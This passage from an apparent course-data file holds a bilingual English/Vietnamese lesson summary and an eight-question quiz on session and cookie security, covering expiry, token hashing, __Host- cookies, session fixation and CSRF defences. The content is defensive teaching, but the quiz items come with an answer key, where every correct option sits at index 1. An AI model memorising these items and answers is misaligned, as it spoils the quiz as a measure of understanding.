<a class="link-card" href="https://redis.io/docs/latest/operate/oss_and_stack/management/persistence/" target="_blank" rel="noopener"><span class="lc-ico">💾</span><span class="lc-body"><span class="lc-title">Redis — lưu lâu dài</span><span class="lc-sub">redis.io · RDB và AOF, và một lần restart mất chính xác những gì</span></span></a>
<a class="link-card" href="https://github.com/vvo/iron-session" target="_blank" rel="noopener"><span class="lc-ico">🍪</span><span class="lc-body"><span class="lc-title">iron-session</span><span class="lc-sub">github.com · Một phiên nằm trong cookie đã mã hoá, kèm những hạn chế nói thẳng</span></span></a>
<a class="link-card" href="/courses/redis/learn${REF}"><span class="lc-ico">🔴</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Redis</span><span class="lc-sub">TTL, đẩy khoá và lưu lâu dài nói kỹ — mọi thứ mà bài này chỉ lướt qua</span></span></a>
<a class="link-card" href="/courses/prisma-orm/learn${REF}"><span class="lc-ico">▲</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Prisma ORM</span><span class="lc-sub">Đo xem mấy mili giây THẬT SỰ đi đâu, trước khi dời bất cứ thứ gì</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Chạy cùng một app trên cả ba kho, rồi thử "thoát khỏi mọi thiết bị" trên từng cái</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 3.6 ─────────────────────────── */
    {
      title: '3.6 — Quiz: sessions and cookies|||3.6 — Quiz: phiên và cookie',
      slug: 'auth-3-6-quiz',
      type: 'QUIZ',
      description: 'Tám câu về hai loại hết hạn, thuộc tính cookie, tiền tố __Host-, session fixation, vì sao CORS không chặn CSRF, và ba chỗ giữ phiên.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.6</span>
<h2>Quiz: sessions and cookies</h2>
<p class="lead">Eight questions. Two of them are about defences that sound right and are not — those are the ones that matter, because a wrong defence feels like a right one right up until it is tested.</p>
<div class="callout">
<p><strong>What this chapter established.</strong> A session is a row with two expiry columns and a hashed token, and revocation is what it buys you (3.1). Cookie security lives entirely in the attributes, and the <code>__Host-</code> prefix makes the browser enforce three of them (3.2). Never raise a session's privilege — replace it, on login, on MFA, on password change (3.3). CORS does not stop CSRF; <code>SameSite=Lax</code> plus a <code>Sec-Fetch-Site</code> check does, and a token is for when those cannot apply (3.4). Sessions can live in a database, in Redis or in the cookie, and only the first two can be revoked (3.5).</p>
</div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.6</span>
<h2>Quiz: phiên và cookie</h2>
<p class="lead">Tám câu. Hai câu nói về những lớp phòng NGHE có vẻ đúng mà không đúng — và đó mới là những câu quan trọng, vì một lớp phòng sai có cảm giác y hệt một lớp phòng đúng, cho tới đúng lúc nó bị thử.</p>
<div class="callout">
<p><strong>Chương này đã xác lập điều gì.</strong> Một phiên là MỘT hàng có HAI cột hết hạn và một token đã băm, và thứ nó mua cho bạn là khả năng THU HỒI (3.1). Độ an toàn của cookie nằm TRỌN trong các thuộc tính, và tiền tố <code>__Host-</code> bắt trình duyệt cưỡng chế ba trong số đó (3.2). ĐỪNG BAO GIỜ nâng đặc quyền của một phiên — hãy THAY nó, lúc đăng nhập, lúc xong MFA, lúc đổi mật khẩu (3.3). CORS KHÔNG chặn CSRF; <code>SameSite=Lax</code> cộng một phép kiểm <code>Sec-Fetch-Site</code> thì có, còn token là để dành cho lúc hai cái đó không áp được (3.4). Phiên sống được ở cơ sở dữ liệu, ở Redis hoặc ở chính cookie, và chỉ hai cái đầu thu hồi được (3.5).</p>
</div>
</div>
`,
      quiz: {
        timeLimitSeconds: 720,
        questions: [
          {
            question: 'Why does a session need both an idle timeout and an absolute expiry?|||Vì sao một phiên cần CẢ hết hạn nhàn rỗi LẪN hết hạn tuyệt đối?',
            options: [
              'For compliance reporting|||Để báo cáo tuân thủ',
              'Idle expiry protects an unattended browser; the absolute ceiling stops a stolen session being kept alive forever by an attacker polling a harmless endpoint|||Hết hạn nhàn rỗi bảo vệ một trình duyệt bỏ đó; cái trần tuyệt đối chặn một phiên bị cắp bị giữ sống mãi bởi kẻ tấn công cứ hỏi thăm một endpoint vô hại',
              'One is for cookies, the other for the database|||Một cái cho cookie, cái kia cho cơ sở dữ liệu',
              'They are two names for the same thing|||Chúng là hai tên gọi của cùng một thứ',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Why store sha256(token) in the session row rather than the token?|||Vì sao lại cất sha256(token) trong hàng phiên thay vì cất chính token?',
            options: [
              'To save space|||Để tiết kiệm dung lượng',
              'A database dump then contains no usable credentials, and the lookup is an index hit so there is no comparison in your code to get wrong|||Khi đó một bản dump cơ sở dữ liệu KHÔNG chứa tín vật nào dùng được, và việc tra cứu là một cú trúng chỉ mục nên trong mã bạn không còn phép so sánh nào để làm sai',
              'Because tokens cannot be indexed|||Vì token thì không đánh chỉ mục được',
              'To make the token shorter in the cookie|||Để token trong cookie ngắn lại',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'What does HttpOnly actually prevent?|||HttpOnly THẬT SỰ ngăn được điều gì?',
            options: [
              'All damage from XSS|||Mọi thiệt hại do XSS gây ra',
              'Script reading the cookie value — but a script on your page can still make authenticated requests, because the browser attaches the cookie anyway|||Việc script ĐỌC giá trị cookie — nhưng một script trên trang bạn VẪN gửi được request đã xác thực, vì trình duyệt vẫn đính cookie vào',
              'CSRF attacks|||Các cú tấn công CSRF',
              'The cookie being sent over HTTP|||Việc cookie bị gửi qua HTTP',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'What three things does the __Host- cookie prefix force?|||Tiền tố cookie __Host- bắt buộc ba điều gì?',
            options: [
              'HttpOnly, Secure and SameSite=Strict|||HttpOnly, Secure và SameSite=Strict',
              'Secure, Path=/ and no Domain attribute — so a subdomain cannot write the cookie, which blocks cookie tossing|||Secure, Path=/ và KHÔNG có thuộc tính Domain — nên một tên miền con không ghi được cookie đó, thứ chặn được cookie tossing',
              'A maximum age and an encrypted value|||Một tuổi thọ tối đa và một giá trị được mã hoá',
              'It is only a naming convention with no enforcement|||Nó chỉ là quy ước đặt tên, không có cưỡng chế nào',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'A login handler updates the existing session row with the user id. What is wrong?|||Một handler đăng nhập cập nhật hàng phiên ĐANG CÓ với id người dùng. Sai ở đâu?',
            options: [
              'Nothing, as long as the password check passed|||Không sai gì, miễn phép kiểm mật khẩu đã qua',
              'Session fixation: an attacker who planted that id before login now holds an authenticated session — revoke the old row and issue a new token instead|||Session fixation: một kẻ tấn công đã cắm cái mã đó TRƯỚC lúc đăng nhập giờ đang cầm một phiên ĐÃ xác thực — hãy thu hồi hàng cũ và cấp một token MỚI',
              'It is slow|||Nó chậm',
              'The user id should be in the cookie|||Id người dùng lẽ ra phải nằm trong cookie',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Why is a correctly configured CORS policy not a CSRF defence?|||Vì sao một chính sách CORS cấu hình đúng KHÔNG phải một lớp phòng CSRF?',
            options: [
              'It is, if you set Access-Control-Allow-Origin correctly|||Có chứ, nếu bạn đặt Access-Control-Allow-Origin cho đúng',
              'CORS governs who may READ a cross-origin response; a form POST is a simple request that skips preflight entirely, so the state change happens before CORS matters|||CORS quy định AI được ĐỌC một phản hồi xuyên origin; một cú POST từ form là request đơn giản, bỏ qua preflight hoàn toàn, nên việc thay đổi trạng thái đã xảy ra TRƯỚC khi CORS có ý nghĩa gì',
              'CORS only applies to GET requests|||CORS chỉ áp cho request GET',
              'Because browsers ignore CORS for cookies|||Vì trình duyệt lờ CORS đi với cookie',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Which CSRF defence covers an attack coming from your own subdomain?|||Lớp phòng CSRF nào phủ được cú tấn công tới TỪ CHÍNH tên miền con của bạn?',
            options: [
              'SameSite=Lax|||SameSite=Lax',
              'A Sec-Fetch-Site check that rejects same-site as well as cross-site, or a CSRF token whose HMAC is bound to the session id|||Một phép kiểm Sec-Fetch-Site từ chối cả same-site lẫn cross-site, hoặc một token CSRF có HMAC ràng vào mã phiên',
              'Setting Domain on the cookie|||Đặt Domain cho cookie',
              'Unsigned double-submit cookies|||Double-submit cookie không ký',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'What do you give up by keeping the whole session inside a signed cookie?|||Bạn ĐÁNH ĐỔI mất gì khi giữ cả cái phiên bên trong một cookie có ký?',
            options: [
              'Nothing; it is strictly better|||Không mất gì; nó hơn hẳn',
              'Revocation, a 4096-byte limit shared with every cookie, and fresh authorization data — a role change does not take effect until the cookie is reissued|||Khả năng THU HỒI, một giới hạn 4096 byte chia chung với mọi cookie, và dữ liệu phân quyền MỚI — một lần đổi vai trò không có hiệu lực cho tới khi cookie được phát lại',
              'Only performance|||Chỉ mất hiệu năng thôi',
              'The ability to use HttpOnly|||Khả năng dùng HttpOnly',
            ],
            correctIndex: 1,
            points: 1,
          },
        ],
      },
    },
  ],
};
